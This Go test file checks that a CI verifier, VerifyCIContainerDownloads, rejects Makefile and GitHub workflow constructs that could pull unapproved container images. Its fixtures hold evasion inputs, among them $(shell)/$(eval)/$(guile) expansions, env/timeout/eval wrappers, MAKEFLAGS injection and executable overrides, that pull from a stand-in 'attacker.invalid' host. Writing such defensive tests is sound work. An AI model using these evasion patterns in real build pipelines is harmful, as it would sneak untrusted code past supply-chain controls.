package releaseverify

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

func TestVerifyCIContainerDownloadsRejectsRecipeTimeMakeSynthesis(t *testing.T) {
	tests := map[string]string{
		"shell":               `@echo $(shell docker pull attacker.invalid/image:pinned)`,
		"braced shell":        `@echo ${shell docker pull attacker.invalid/image:pinned}`,
		"eval":                `@echo $(eval ACQUIRE := docker pull attacker.invalid/image:pinned)`,
		"file":                `@echo $(file >marker,docker pull attacker.invalid/image:pinned)`,
		"guile":               `@echo $(guile (system "docker pull attacker.invalid/image:pinned"))`,
		"call indirection":    `@echo $(call $(FUNCTION),docker pull attacker.invalid/image:pinned)`,
		"value indirection":   `@$(value ACQUIRE)`,
		"foreach indirection": `@echo $(foreach image,attacker.invalid/image:pinned,$(shell docker pull $(image)))`,
		"continued function":  "@echo $(sh\\\nell docker pull attacker.invalid/image:pinned)",
	}
	for name, recipe := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			module := "FUNCTION := shell\nACQUIRE := docker pull attacker.invalid/image:pinned\n.PHONY: android\nandroid:\n\t" + recipe + "\n"
			writeFixtureFile(t, filepath.Join(root, "mk", "recipe-synthesis.mk"), module)
			appendMakeInclude(t, root, "mk/recipe-synthesis.mk")
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-android.yml"), readRepositoryWorkflow(t, "ci-android.yml"))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted recipe-time Make expansion that can synthesize acquisition")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsRecursiveMakeControlsAndWrappedEngines(t *testing.T) {
	commands := map[string]string{
		"MAKEFILES assignment":     `$(MAKE) MAKEFILES=attacker.mk safe`,
		"MAKEFLAGS assignment":     `$(MAKE) "MAKEFLAGS=-f attacker.mk" safe`,
		"MFLAGS assignment":        `$(MAKE) MFLAGS=-n safe`,
		"MAKEOVERRIDES assignment": `$(MAKE) MAKEOVERRIDES=TARGET safe`,
		"GNUMAKEFLAGS assignment":  `$(MAKE) GNUMAKEFLAGS=--file=attacker.mk safe`,
		"env short operand":        `env -u HOME docker pull attacker.invalid/image:pinned`,
		"env long operand":         `env --unset HOME docker pull attacker.invalid/image:pinned`,
		"env directory operand":    `env -C /tmp docker pull attacker.invalid/image:pinned`,
		"command wrapper":          `command -- docker pull attacker.invalid/image:pinned`,
		"timeout operands":         `timeout --signal TERM 5 docker pull attacker.invalid/image:pinned`,
		"nice operands":            `nice --adjustment 10 docker pull attacker.invalid/image:pinned`,
		"xargs operands":           `printf image | xargs -n 1 docker pull`,
		"shell eval wrapper":       `eval 'docker pull attacker.invalid/image:pinned'`,
		"continued wrapped engine": "env -u HOME do\\\ncker pull attacker.invalid/image:pinned",
	}
	for name, command := range commands {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			writeFixtureFile(t, filepath.Join(root, "mk", "wrapped-engine.mk"), ".PHONY: android safe\nandroid:\n\t"+command+"\nsafe:\n\t@true\n")
			appendMakeInclude(t, root, "mk/wrapped-engine.mk")
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-android.yml"), readRepositoryWorkflow(t, "ci-android.yml"))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted a recursive Make control or wrapped acquisition executable")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsRecursiveCommandExecutableOverrides(t *testing.T) {
	commands := map[string]string{
		"recursive Docker override":           `$(MAKE) GO=docker safe`,
		"recursive Buildah override":          `$(MAKE) GO=buildah safe`,
		"prefix Docker override":              `GO=docker make safe`,
		"prefix Buildah override":             `GO=buildah make safe`,
		"environment Docker override":         `env GO=docker make safe`,
		"environment Buildah override":        `env GO=buildah make safe`,
		"nested environment Docker override":  `command env GO=docker make safe`,
		"nested environment Buildah override": `timeout 5 env GO=buildah command make safe`,
		"wrapped recursive Docker override":   `command $(MAKE) GO=docker safe`,
		"wrapped recursive Buildah override":  `timeout 5 $(MAKE) GO=buildah safe`,
	}
	for name, command := range commands {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			module := ".PHONY: android safe\nandroid:\n\t" + command + "\nsafe:\n\t$(GO) pull attacker.invalid/image:pinned\n"
			writeFixtureFile(t, filepath.Join(root, "mk", "command-override.mk"), module)
			appendMakeInclude(t, root, "mk/command-override.mk")
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-android.yml"), readRepositoryWorkflow(t, "ci-android.yml"))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted a recursive command-position executable override")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRequiresRegisteredWorkflowFilesGlobally(t *testing.T) {
	for _, workflow := range []string{"ci-agent.yml", "ci-docs.yml"} {
		t.Run(workflow+" deleted", func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			path := filepath.Join(root, ".github", "workflows", workflow)
			writeFixtureFile(t, path, readRepositoryWorkflow(t, workflow))
			if err := os.Remove(path); err != nil {
				t.Fatal(err)
			}
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted deletion of a globally registered workflow")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsBindsActionOnlyWorkflowContext(t *testing.T) {
	tests := map[string]func(*yaml.Node){
		"workflow environment": func(workflow *yaml.Node) {
			setYAMLMappingValue(workflow, "env", yamlMapping("NODE_VERSION", "99"))
		},
		"workflow defaults": func(workflow *yaml.Node) {
			setYAMLMappingValue(workflow, "defaults", yamlMapping("run", "attacker"))
		},
		"workflow permissions": func(workflow *yaml.Node) {
			setYAMLMappingValue(workflow, "permissions", yamlMapping("contents", "write"))
		},
		"job runner": func(workflow *yaml.Node) {
			job := workflowJobNode(t, workflow, "run")
			setYAMLMappingValue(job, "runs-on", scalarYAML("windows-latest"))
		},
	}
	for name, mutate := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			var document yaml.Node
			if err := yaml.Unmarshal([]byte(readRepositoryWorkflow(t, "ci-docs.yml")), &document); err != nil {
				t.Fatal(err)
			}
			mutate(document.Content[0])
			data, err := yaml.Marshal(&document)
			if err != nil {
				t.Fatal(err)
			}
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-docs.yml"), string(data))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted changed inherited context for an action-only workflow")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRequiresTypedWorkflowJobContext(t *testing.T) {
	tests := map[string]struct {
		workflow string
		old      string
		new      string
	}{
		"quoted timeout": {workflow: "ci-image.yml", old: "timeout-minutes: 45", new: `timeout-minutes: "45"`},
		"quoted shard":   {workflow: "ci-playwright.yml", old: "shard: [1, 2, 3, 4]", new: `shard: ["1", 2, 3, 4]`},
	}
	for name, test := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			workflow := strings.Replace(readRepositoryWorkflow(t, test.workflow), test.old, test.new, 1)
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", test.workflow), workflow)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted a string where typed integer workflow context is required")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsJobLevelReusableWorkflows(t *testing.T) {
	root := writeCIContainerDownloadsFixture(t)
	writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-reusable.yml"), `name: reusable bypass
on: push
jobs:
  acquire:
    uses: owner/repository/.github/workflows/pull.yml@0000000000000000000000000000000000000000
`)
	if err := VerifyCIContainerDownloads(root); err == nil {
		t.Fatal("VerifyCIContainerDownloads accepted a job-level reusable workflow")
	}
}

func TestVerifyCIContainerDownloadsRejectsOverridablePostgresImageAuthorities(t *testing.T) {
	tests := map[string]struct {
		variable string
	}{
		"Postgres image file": {variable: "POSTGRES_TEST_IMAGE_FILE"},
		"Hub image prefix":    {variable: "TESTCONTAINERS_HUB_IMAGE_NAME_PREFIX"},
		"legacy Ryuk image":   {variable: "TESTCONTAINERS_RYUK_IMAGE"},
	}
	for name, test := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			path := filepath.Join(root, "mk", "store.mk")
			source := readFixtureFile(t, path)
			if !strings.Contains(source, test.variable+" :=") {
				source = test.variable + " := attacker.invalid/authority\n" + source
			}
			writeFixtureFile(t, path, source)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted a command-line/environment-overridable image authority")
			}
		})
	}
}

func appendMakeInclude(t *testing.T, root, module string) {
	t.Helper()
	path := filepath.Join(root, "Makefile")
	writeFixtureFile(t, path, readFixtureFile(t, path)+"include "+module+"\n")
}

func workflowJobNode(t *testing.T, workflow *yaml.Node, name string) *yaml.Node {
	t.Helper()
	jobs, ok := mappingValue(workflow, "jobs")
	if !ok {
		t.Fatal("workflow has no jobs")
	}
	job, ok := mappingValue(jobs, name)
	if !ok {
		t.Fatalf("workflow has no job %s", name)
	}
	return job
}

func scalarYAML(value string) *yaml.Node {
	return &yaml.Node{Kind: yaml.ScalarNode, Tag: "!!str", Value: value}
}

func yamlMapping(key, value string) *yaml.Node {
	return &yaml.Node{Kind: yaml.MappingNode, Tag: "!!map", Content: []*yaml.Node{scalarYAML(key), scalarYAML(value)}}
}

func setYAMLMappingValue(mapping *yaml.Node, key string, value *yaml.Node) {
	for index := 0; index < len(mapping.Content); index += 2 {
		if mapping.Content[index].Value == key {
			mapping.Content[index+1] = value
			return
		}
	}
	mapping.Content = append(mapping.Content, scalarYAML(key), value)
}
